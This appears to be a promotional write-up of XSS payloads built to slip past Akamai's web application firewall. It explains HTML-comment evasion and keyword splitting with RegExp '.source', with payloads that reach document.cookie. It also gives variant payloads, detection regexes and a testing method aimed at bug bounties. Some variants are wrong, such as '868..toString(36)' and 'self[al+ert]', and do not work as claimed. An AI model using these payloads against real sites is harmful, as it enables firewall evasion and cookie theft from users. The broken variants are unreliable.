# Advanced XSS Bypass for Akamai WAF
![Advanced XSS Bypass for Akamai WAF](https://github.com/user-attachments/assets/02b48638-1fc9-4270-a41d-da6d99e46298)

Bypassing an Akamai WAF involves techniques like obfuscation, leveraging inconsistent data interpretation, and exploiting specific application logic flaws (e.g., parameter pollution or CRLF injection). There is no single "universal" payload; successful bypasses are specific to the target application's configuration and context.

---

## 🔥 The Bypass Payload

```html
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
```

---

## 🛠 How This Bypass Works

### 1. HTML Comment Evasion
```html
<!-->
```
- Starts with an HTML comment tag  
- Akamai may treat this as comment content  
- Browsers still parse and execute what follows  

### 2. Obfuscated JavaScript Execution

```js
top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)
```

Decoded:
```js
top["alert"](document.cookie)
```

### 3. String Construction Breakdown
- `/al/.source` → `"al"`
- `/ert/.source` → `"ert"`
- `"al" + "ert"` → `"alert"`
- `top["alert"]` → `top.alert`

---

## 💡 Why This Bypasses Akamai WAF

- **Keyword Splitting** – avoids matching `alert`
- **RegExp `.source` Abuse** – creates strings without quotes
- **Top-Level Context** – avoids common `window.alert` signatures

---

## ⚡ Advanced Variations

### Alternative String Construction
```html
<!--><svg onload=top[/al/.source+/ert/.source](/XSS/.source)>
<!--><svg onload=top[868..toString(36)](1337)>
<!--><svg onload=self[al+ert](1)>
```

### HTML Tag Obfuscation
```html
<svg><script>/*comment*/top.aler\u0074(1)</script>
<svg><script>top[868..toString(36)](1337)</script>
<svg><script>self[al+ert](document.domain)</script>
```

---

## 🛡 How Akamai Could Block This

### Detection Improvements
1. Context-aware HTML parsing  
2. JavaScript deobfuscation  
3. Behavior-based detection  
4. Detection of `.source` abuse  

### Sample WAF Rules
```regex
/(?:<!\-\-.*?>|\.source\s*\+\s*\.source)/i
/(?:top|self|window)\[.*?\]\(.*?\)/i
```

---

## 🎯 Testing Methodology

1. Test basic `alert(1)`
2. Add HTML comment evasion
3. Split keywords
4. Change execution context
5. Modify string construction logic

---

## 💰 Bug Bounty Impact

- High-severity XSS
- Common in enterprise targets
- High bounty potential
- Strong chaining opportunities

---

🔔 Follow **@cybersecplayground** for more WAF bypass techniques!

#XSS #WAFBypass #Akamai #WebSecurity #BugBounty #CyberSecurity #PenTesting
